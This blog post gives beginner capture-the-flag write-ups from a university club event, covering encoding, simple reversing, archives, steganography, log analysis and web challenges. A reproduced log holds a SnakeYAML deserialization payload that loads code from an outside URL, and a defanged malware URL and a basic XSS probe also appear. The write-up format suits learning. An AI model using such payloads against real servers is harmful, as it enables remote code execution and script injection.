---
title: "NEU CTF Club 'Red Envelope Riddles'"
description: 'Fourth Post'
pubDatetime: 2025-01-27T00:00:00Z
heroImage: '/rer/title.png'
---
I was a little late to the GM but I got a decent portion of the challenges done besides the last two


## Pattern Recognition
---
This snake's got some funny patterns on its back! Can you help me decipher them?

01000011 01010100 01000110 01111011 01110011 01110011 01110011 01110011 01110101 01110000 01100101 01110010 01011111 01110011 01100101 01100011 01110010 01100101 01110100 01111101

---
This is a binary encoding with a byte length of 8, decoding on cyberchef with `delimiter=space` outputs the flag. 

**Flag**: CTF{ssssuper_secret}

## Geolosnake
---
Finish the Toy Story quote: "There's a snake in my ____!" 

Make sure to wrap the missing word in CTF{} and put it in all lowercase.

---
Looking up the quote and toy story shows that the flag is boot.

**Flag**: CTF{boot}


## Ancient Antidote
---
Help! I've been bitten by a snake and I think it was poisonous! This ancient program allegedly contains the antidote though... if only I could read it

---

Attached File: `snake-antidote.py`

```py
# snake-antidote.py

guess = input("What do you think the antidote is? ")

if ord(guess[0]) != 67:
    print("Nope!")
elif ord(guess[1]) != 84:
    print("Nope!")
elif ord(guess[2]) != 70:
    print("Nope!")
elif ord(guess[3]) != 123:
    print("Nope!")
elif ord(guess[4]) != 119:
    print("Nope!")
elif ord(guess[5]) != 52:
    print("Nope!")
elif ord(guess[6]) != 108:
    print("Nope!")
elif ord(guess[7]) != 107:
    print("Nope!")
elif ord(guess[8]) != 95:
    print("Nope!")
elif ord(guess[9]) != 105:
    print("Nope!")
elif ord(guess[10]) != 116:
    print("Nope!")
elif ord(guess[11]) != 95:
    print("Nope!")
elif ord(guess[12]) != 48:
    print("Nope!")
elif ord(guess[13]) != 102:
    print("Nope!")
elif ord(guess[14]) != 102:
    print("Nope!")
elif ord(guess[15]) != 125:
    print("Nope!")
else:
    print("You got it!")
```

The `ord()` function converts a unicode character into its integer representation so we just have to copy and paste the individual integer values and reverse them.

Putting the sequence `67 84 70 123 119 52 108 107 95 105 116 95 48 102 102 125` into cyberchef and using `From Charcode` with `base=10` gives us the flag.

**Flag**: CTF{w4lk_it_0ff}

## Totally Lucky
---
I was so lucky my antivirus detected a malicious file on my laptop with the hash a259082f33573151375ea00df28468fd.

I want to know more about it though. This file makes a shell command with a URL inside of it. What is the full URL contained?

Format the flag as: CTF{http://domain.tld/file.extension}

---

Open the hash in VirusTotal and browse to behavior to find a couple of urls that may be the flag.

**Flag**: CTF{hxxp://ttgholidays.com/s[.]png} (defanged a little just in case)



## Slithery
---
I was writing a cool program to do some super special encryption, but before I wrote the decryption function, a snake slithered onto my keyboard and broke it! I already encrypted some data with it, but now I can't get it back! Can you help?

Encrypted Data: 209 260 218 377 257 236 155 260 224 161 254 275 293 257 242 164 233 161 383

---

Attached File: `snek.py`

```py
# snek.py
def slither(flag):
    f = []

    for char in flag:
        x = format(ord(char), 'x') 
        y = int(x, 16)
        z = (y * 3)
        z = z + 8
        f.append(z)

    return " ".join(map(str, f))


if __name__ == "__main__":
    flag = input("Enter the flag: ")
    stuff = slither(flag)
    print("stuffed flag:", stuff)
```
The numbers `209 260 218 377 257 236 155 260 224 161 254 275 293 257 242 164 233 161 383` is the result of some input into the program. 

Looking at the code, it iterates through the flag and gets the unicode code of each character and does some mathematical operations onto it before appending it to an array. To solve it, we can try to undo these operations:

```py
lst = [209, 260, 218, 377, 257, 236, 155, 260, 224, 161, 254, 275, 293, 257, 242, 164, 233, 161, 383]

def reverse(flag):
    a = []
    for c in flag:
        c = int(c)
        c -= 8
        c = int(c/3)
        a.append(chr(c))
    print("".join(a))

reverse(lst)
```

**Flag**: CTF{SL1TH3RY_SN4K3}


## Shrink 
---
This snake used to be so huge... what happened to it?

---
Attached File: `shrink`

1. Running `file` on the file tells us that it is a `POSIX tar archive (GNU)`. 
2. We can run `tar -xvf shrink` to extract `shrank`. 
3. Running `file` on `shrank` tells us: `shrank: gzip compressed data, was "stuff.txt", last modified: Sun Jan 26 20:49:00 2025, from Unix, original size modulo 2^32 59`.
4. We can then run `mv shrank shrank.gz` to rename it with the gunzip extension.
5. Then, run `gunzip -d shrank.gz` and run `file` on it again to see that it is now an `ASCII text` file.
6. `cat` the flag.

```
roya@LAPTOP-XXXXXXXX:/mnt/c/Users/roya/Downloads$ cat shrank
00000000
11111111
CTF{EXPANDDDDDDDDDDDD}
11111111
00000000
```

**Flag**: CTF{EXPANDDDDDDDDDDDD}

## The Slippery Snake
---
Analyze the logs to uncover the payload the attack used to identify the exploited CVE to get the flag.

Access Log
Application Log

Flag format: CTF{CVE-YYYY-NNNN}

---

Attached Files: `access.log`, `application.log`

```
// access.log
192.168.1.101 - - [22/Jan/2025:14:30:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.102 - - [22/Jan/2025:14:31:00 +0000] "POST /api/upload HTTP/1.1" 200 456 "-" "curl/7.64.1"
192.168.1.103 - - [22/Jan/2025:14:32:10 +0000] "GET /static/css/main.css HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64)"
192.168.1.104 - - [22/Jan/2025:14:33:30 +0000] "POST /process-yaml HTTP/1.1" 200 512 "-" "Python-urllib/3.9"

192.168.1.105 - - [22/Jan/2025:14:34:12 +0000] "POST /process-yaml HTTP/1.1" 500 0 "-" "Python-urllib/3.9"

192.168.1.106 - - [22/Jan/2025:14:35:45 +0000] "GET /about.html HTTP/1.1" 200 789 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.107 - - [22/Jan/2025:14:36:00 +0000] "POST /api/data HTTP/1.1" 200 123 "-" "PostmanRuntime/7.26.5"
192.168.1.108 - - [22/Jan/2025:14:37:00 +0000] "POST /process-yaml HTTP/1.1" 200 512 "-" "curl/7.68.0"

192.168.1.109 - - [22/Jan/2025:14:38:00 +0000] "POST /process-yaml HTTP/1.1" 500 0 "-" "curl/7.68.0"

192.168.1.110 - - [22/Jan/2025:14:39:00 +0000] "GET /docs/api.html HTTP/1.1" 200 987 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

```
// application.log
2025-01-22 14:32:10 INFO [main] Starting application version 1.3.2.
2025-01-22 14:32:15 WARN [main] Deprecated configuration key detected: 'use_legacy_mode'.
2025-01-22 14:32:20 INFO [worker-1] Processing request ID: 1456
2025-01-22 14:32:30 INFO [worker-2] Successfully processed user data from endpoint /users/submit.
2025-01-22 14:32:45 ERROR [worker-3] NullPointerException: Attempted to access null object.

2025-01-22 14:34:12 ERROR [worker-6] org.yaml.snakeyaml.constructor.ConstructorException:
Exception in YAML deserialization: Unauthorized deserialization attempt detected.
Stacktrace:
java.lang.ClassNotFoundException: javax.script.ScriptEngineManager
    at org.yaml.snakeyaml.constructor.SafeConstructor$ConstructYamlObject.construct(SafeConstructor.java:460)
    at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:182)
    at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)
    at org.yaml.snakeyaml.Yaml.load(Yaml.java:429)

2025-01-22 14:35:00 INFO [worker-1] HTTP request received: POST /submit
2025-01-22 14:36:00 INFO [worker-2] File upload received from user: /tmp/user123/upload.txt
2025-01-22 14:37:15 WARN [worker-3] Disk usage nearing threshold: 80% used.

2025-01-22 14:38:00 INFO [worker-4] YAML processing request received:
!!com.example.ValidClass [key: "safe_value"]
2025-01-22 14:38:05 INFO [worker-4] YAML processed successfully.

2025-01-22 14:40:00 INFO [worker-5] YAML processing request received:
!!javax.script.ScriptEngineManager [!!java.net.URL ["http://safe-site.com/resource"]]
2025-01-22 14:40:05 INFO [worker-5] YAML processed successfully.

2025-01-22 14:41:00 INFO [worker-6] YAML processing request received from /process-yaml:
POST body included !!javax.script.ScriptEngineManager [!!java.net.URL ["http://bit.ly/3explt"]]
2025-01-22 14:41:05 ERROR [worker-6] org.yaml.snakeyaml.constructor.ConstructorException:
Exception in YAML deserialization: Unauthorized deserialization attempt detected.
Stacktrace:
java.lang.ClassNotFoundException: javax.script.ScriptEngineManager
    at org.yaml.snakeyaml.constructor.SafeConstructor$ConstructYamlObject.construct(SafeConstructor.java:460)
    at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:182)
    at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)
    at org.yaml.snakeyaml.Yaml.load(Yaml.java:429)
```

Doing a little bit of googling with the `process-yaml` and `javax.script.ScriptEngineManager`, I queried `POST body included !!javax.script.ScriptEngineManager CVE` and got a couple of results that references SnakeYAML but the CVE number is limited to 4 digits so I ended up looking adding SnakeYAML to the query and tested `CVE-2022-1471` which was the flag.

**Flag**: CTF{CVE-2022-1471}

## Lunar Light
---
Sometimes you need more than just moonlight to really see an image!

![lunar img](/rer/lunar.png "Lunar Image") 
---

Paste the image into a online steganography tool like [StegOnline](https://georgeom.net/StegOnline/image) and play around with the settings. Using the LSB Half filter, we can reveal the flag:

![lunar img revealed](/rer/revealed.png "LSB Filter on Image") 

**Flag**: CTF{M00NLIT_R3V3AL}

## Paths to Prosperity
---
Paths to Prosperity
Can you find where I've hidden my flag?

Hunt here
---

Navigating to the link brings us to `https://20250127.gm.neu-ctf.club/paths` and opening the page source we can see:
```html
<!DOCTYPE html>
<html>
	<link href="secret/assets/index.css" rel="stylesheet" />
	<head>
		<title>Paths</title>
	</head>
	<body>
		<div class="container">
			<h1>Welcome!</h1>
			<p> Can you find the flag? It's not here... </p>
		</div>
	</body>
</html>
```

Then we append `/secret` to the end of the path to get to another page:

```html
<!DOCTYPE html>
<html>
	<link href="supersecret/index.css" rel="stylesheet" />
	<head>
		<title>Paths</title>
	</head>
	<body>
		<div class="container">
			<div class="content-wrapper">
				<h1>Oh hey!</h1>
				<p> You're on the right track, but not quite there yet... </p>
			</div>
		</div>
	</body>
</html>
```

After that we append `/supersecret` to the end of the previous path which brings us to a submit page.
```html
<!DOCTYPE html>
<html>
	<head>
		<title>Paths</title>
	</head>
	<body>
		<div class="container">
<h2>I'll tell you the flag...</h2><p>but you have to help me to announce it</p>			<form action="" method="post">
				<input type="text" name="ans">
				<button type="submit">Submit</button>
			</form>
		</div>
	</body>
</html>
```
The flavor text tells us to somehow **announce** the flag:

![Paths to Prosperity](/rer/submit.png "Submit page") 

I didn't really know what to do at this point so I ended up thinking for a little bit and then I tried to inject some basic javascript into the form by adding `<script>alert('alert');</script>` and pressing submit which then gave us the flag. 

![flag solution](/rer/announce.png "solution") 

**Flag**: CTF{traversing_new_paths}

